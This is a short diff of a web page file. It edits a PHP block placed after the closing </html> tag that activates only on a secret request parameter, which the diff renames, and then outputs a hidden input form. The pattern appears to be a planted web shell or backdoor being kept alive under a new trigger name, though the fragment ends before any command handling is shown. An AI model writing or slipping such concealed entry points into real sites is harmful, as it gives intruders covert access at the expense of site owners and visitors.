@@ -7,7 +7,7 @@
 </html>
 
 <?php
-if(isset($_REQUEST['kronkz>>>'])){
+if(isset($_REQUEST['gobloklo'])){
         echo "<pre>";
         echo "<form name='form' action='#' method='post'>
        <input type='text' name='coba'/> <input type='submit' value='enter'/>
